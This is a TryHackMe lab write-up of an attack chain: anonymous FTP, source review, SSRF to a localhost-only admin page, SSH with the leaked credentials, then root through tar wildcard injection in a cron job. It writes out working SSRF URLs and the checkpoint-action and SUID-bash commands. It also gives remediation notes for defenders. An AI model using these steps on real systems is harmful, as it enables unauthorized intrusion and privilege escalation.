# Operation Coldstart --- TryHackMe Write-up

> **Scope:** Educational CTF/lab write-up.\
> **Spoiler policy:** Room flags and reusable credentials are
> intentionally masked.

## Overview

Operation Coldstart begins with basic service enumeration and progresses
through:

1.  Network/service enumeration
2.  Anonymous FTP access
3.  Web directory enumeration
4.  Source-code review
5.  SSRF against an allow-listed internal hostname
6.  SSH access using credentials exposed by the internal admin endpoint
7.  Linux privilege escalation through a root cron job using a `tar`
    wildcard

The most important lesson is that individually small weaknesses can form
a complete compromise chain.

------------------------------------------------------------------------

## 1. Initial Enumeration

Start with an Nmap default-script and version scan:

``` bash
nmap -sC -sV <TARGET_IP>
```

### Important findings

  ---------------------------------------------------------------------------
  Port                    Service                 Observation
  ----------------------- ----------------------- ---------------------------
  21/tcp                  FTP                     `vsftpd 3.0.5`; anonymous
                                                  login allowed

  22/tcp                  SSH                     OpenSSH on Ubuntu

  80/tcp                  HTTP                    Gunicorn application; title
                                                  `URL Preview - Volt Labs`
  ---------------------------------------------------------------------------

The FTP service immediately stands out because anonymous authentication
is enabled.

------------------------------------------------------------------------

## 2. Anonymous FTP Enumeration

Connect to FTP:

``` bash
ftp <TARGET_IP>
```

Use:

``` text
Name: anonymous
```

Enumerate the available files:

``` text
ftp> ls
ftp> cd pub
ftp> ls
```

A backup archive is exposed:

``` text
backup.tar.gz
```

Download it:

``` text
ftp> get backup.tar.gz
```

### Why this matters

Anonymous FTP is not automatically a vulnerability, but exposing
application backups can reveal source code, configuration details,
internal hostnames, credentials, and security logic.

------------------------------------------------------------------------

## 3. Web Directory Enumeration

Enumerate the web application:

``` bash
gobuster dir \
  -u http://<TARGET_IP> \
  -w /usr/share/wordlists/dirb/common.txt \
  -x txt,php,html,bak
```

Interesting routes discovered:

``` text
/admin
/preview
```

`/preview` is especially important because the application allows a
user-supplied URL to be fetched by the server.

------------------------------------------------------------------------

## 4. Extracting and Reviewing the FTP Backup

Create a directory and extract the archive:

``` bash
mkdir tar
tar -xvzf backup.tar.gz -C tar
cd tar/voltlabs-preview
ls
```

The archive contains:

``` text
README.md
app.py
requirements.txt
```

### README.md

The README reveals two useful facts:

``` text
Internal staging tool.
Admin routes are gated by source-IP check (localhost only).
```

This suggests the admin route cannot normally be reached remotely, so
the application may need to be tricked into requesting it locally.

### requirements.txt

The application uses:

``` text
flask
requests
gunicorn
```

------------------------------------------------------------------------

## 5. Source-Code Analysis

The important logic in `app.py` is the URL preview functionality.

The application defines an approved hostname:

``` python
ALLOWED_HOSTS = {"kestrel.thm"}
```

The preview route extracts only the hostname and checks whether it is in
the allow-list:

``` python
host = (urlparse(target).hostname or "").lower()

if host not in ALLOWED_HOSTS:
    # request blocked
```

If allowed, the server performs the request itself:

``` python
r = requests.get(target, timeout=3)
```

The comments/source also indicate that the internal hostname resolves to
localhost.

### Admin restriction

The admin route checks the source IP:

``` python
if not request.remote_addr.startswith("127."):
    abort(403)
```

This creates the key attack path:

``` text
Attacker
   |
   | supplies approved internal URL
   v
/preview
   |
   | server performs request
   v
kestrel.thm -> 127.0.0.1
   |
   v
/admin/...
```

------------------------------------------------------------------------

## 6. SSRF --- Server-Side Request Forgery

### What is SSRF?

**Server-Side Request Forgery (SSRF)** occurs when an attacker can
influence a server to make a network request on the attacker's behalf.

Here, direct access to `/admin/` is restricted to localhost. However,
the `/preview` endpoint itself runs on the target server and can request
the approved internal hostname.

Test the internal hostname through the preview endpoint:

``` text
http://<TARGET_IP>/preview?url=http://kestrel.thm
```

The request succeeds because `kestrel.thm` is allow-listed.

Next, request the internal admin notes through the same preview
function:

``` text
http://<TARGET_IP>/preview?url=http://kestrel.thm/admin/notes
```

The response exposes staging SSH credentials.

> **Credential redaction:** The username/password recovered in the lab
> are intentionally not reproduced here.

### Why the localhost check fails

The admin route trusts the source address. A direct attacker request
does not originate from `127.0.0.1`, but the SSRF request does because
the vulnerable application makes the request locally.

This is a good example of why **source-IP checks alone are weak
authorization controls**.

------------------------------------------------------------------------

## 7. Initial SSH Access

Use the credentials recovered from the internal notes:

``` bash
ssh <REDACTED_USER>@<TARGET_IP>
```

Enter the recovered password when prompted.

After login, begin local enumeration.

------------------------------------------------------------------------

## 8. Cron Job Enumeration

Inspect system cron jobs:

``` bash
ls /etc/cron.d/
```

A custom job is present:

``` text
voltlabs-backup
```

Read it:

``` bash
cat /etc/cron.d/voltlabs-backup
```

Important line:

``` cron
* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

This means:

-   The job runs **every minute**.
-   It runs as **root**.
-   It changes into `/opt/backups`.
-   It runs `tar` using the wildcard `*`.

Check permissions:

``` bash
cd /opt/backups
ls -la
```

The low-privileged user can write files in this directory.

That combination creates the privilege-escalation opportunity.

------------------------------------------------------------------------

## 9. Understanding the `tar` Wildcard Vulnerability

The cron command is:

``` bash
tar czf /var/backups/uploads.tgz *
```

The important detail is that the shell expands `*` **before** `tar`
processes the command.

For example, if the directory contains filenames such as:

``` text
file1
file2
--some-option
```

the shell can effectively turn the command into something similar to:

``` bash
tar czf /var/backups/uploads.tgz file1 file2 --some-option
```

A filename beginning with `--` can therefore be interpreted by `tar` as
a command-line option.

Because the vulnerable `tar` command runs as root, an injected `tar`
action also runs with root privileges.

------------------------------------------------------------------------

## 10. Privilege Escalation

Move to the writable backup directory:

``` bash
cd /opt/backups
```

Create the checkpoint option:

``` bash
touch -- '--checkpoint=1'
```

Create a script that copies Bash and applies the SUID bit:

``` bash
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh
```

Create the second malicious filename:

``` bash
touch -- '--checkpoint-action=exec=sh shell.sh'
```

When the root cron job runs, the wildcard expands these filenames and
`tar` interprets them as options.

After the cron job executes, check:

``` bash
ls -l /tmp/bash
```

Run the SUID Bash while preserving privileges:

``` bash
/tmp/bash -p
```

Verify:

``` bash
id
```

The effective UID should now be root.

### Attack flow

``` text
webdev / low-privileged user
        |
        | create shell.sh
        v
/opt/backups/shell.sh
        |
        | create filenames beginning with --
        v
--checkpoint=1
--checkpoint-action=exec=sh shell.sh
        |
        | root cron runs:
        v
tar czf /var/backups/uploads.tgz *
        |
        | Bash expands *
        v
malicious filenames become tar arguments
        |
        v
tar executes shell.sh
        |
        | running as root
        v
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
        |
        v
/tmp/bash -p
        |
        v
ROOT SHELL
```

------------------------------------------------------------------------

## 11. Root Flag

After privilege escalation:

``` bash
cd /root
ls
cat flag.txt
```

Output:

``` text
THM{REDACTED}
```

The actual flag is intentionally omitted from this public write-up.

------------------------------------------------------------------------

## Key Takeaways

### 1. Anonymous FTP can expose more than files

A small backup archive revealed the application's internal architecture
and security controls.

### 2. Source code can reveal the intended attack surface

Reviewing `app.py` exposed:

-   the allow-listed internal hostname,
-   the server-side URL fetch,
-   the localhost-only admin check,
-   and the route containing sensitive notes.

### 3. SSRF can bypass network or source-IP restrictions

The attacker could not directly appear as localhost, but the vulnerable
server could make the request on the attacker's behalf.

### 4. Wildcards in privileged scripts are dangerous

The three details to remember are:

1.  `*` is expanded by the shell into filenames.
2.  Filenames beginning with `--` may be interpreted by a command as
    options.
3.  If the vulnerable command runs as root, injected behavior can also
    execute as root.

------------------------------------------------------------------------

## Vulnerability Chain

  -----------------------------------------------------------------------
  Stage                   Weakness                Result
  ----------------------- ----------------------- -----------------------
  Recon                   Anonymous FTP           Backup archive
                                                  discovered

  Information disclosure  Application source      Internal hostname and
                          backup                  security logic exposed

  Web exploitation        SSRF                    Local-only admin
                                                  endpoint reached

  Information disclosure  Admin notes             SSH credentials exposed

  Local enumeration       Writable cron working   Privilege-escalation
                          directory               path identified

  Privilege escalation    `tar` wildcard/options  Root shell obtained
                          injection               
  -----------------------------------------------------------------------

------------------------------------------------------------------------

## Remediation Notes

For defenders, the main fixes would be:

-   Disable anonymous FTP unless it is explicitly required.
-   Never expose application backups through public services.
-   Do not store plaintext credentials in application-accessible notes.
-   For URL-fetching services, validate scheme, hostname, resolved IP,
    redirects, and destination after DNS resolution.
-   Do not use source IP as the only authorization mechanism for
    sensitive routes.
-   Avoid unsafe wildcard expansion in privileged cron jobs.
-   Ensure directories processed by root-owned automation are not
    writable by lower-privileged users.

------------------------------------------------------------------------

## Disclaimer

This write-up documents activity performed in an authorized
TryHackMe/CTF-style lab environment. Techniques shown here should only
be used on systems you own or have explicit permission to test.
